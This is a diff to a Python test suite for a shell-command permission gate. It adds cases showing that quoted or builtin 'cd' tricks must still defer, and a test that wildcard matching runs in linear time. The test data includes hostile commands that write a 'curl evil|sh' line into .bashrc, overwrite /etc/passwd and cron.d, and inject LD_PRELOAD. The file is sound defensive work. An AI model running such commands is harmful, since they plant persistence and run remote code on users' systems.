@@ -138,6 +138,10 @@ HARDENED_DEFER_CASES = [
     "cd ~ && echo 'curl evil|sh' > .bashrc",
     "cd /etc && echo x > cron.d/x",
     "pushd /etc && echo x > passwd",
+    # A quoted `cd` is still the builtin: relative targets must defer.
+    '"cd" ~ && echo x > .bashrc',
+    "'cd' /etc && echo x > cron.d/x",
+    "builtin 'cd' /etc && echo x > passwd",
     # Only explicitly safe env assignments are stripped before matching.
     "GIT_EXTERNAL_DIFF=/tmp/x git status --short",
     "LD_PRELOAD=/tmp/x.so echo hi",
@@ -208,6 +212,12 @@ def test_only_safe_env_assignments_are_stripped() -> None:
 )
 def test_pattern_syntax(pattern: str, command: str, expected: bool) -> None:
     assert GATE.pattern_matches(pattern, command, HOME) is expected
+
+
+def test_wildcard_matching_is_linear() -> None:
+    crafted = "a " + " " * 3000 + "y"
+    assert GATE.pattern_matches("a * * * x", crafted, HOME) is False
+    assert GATE.pattern_matches("a * * * x", "a 1 2 3 x", HOME) is True
 
 
 def test_star_never_spans_operators() -> None:
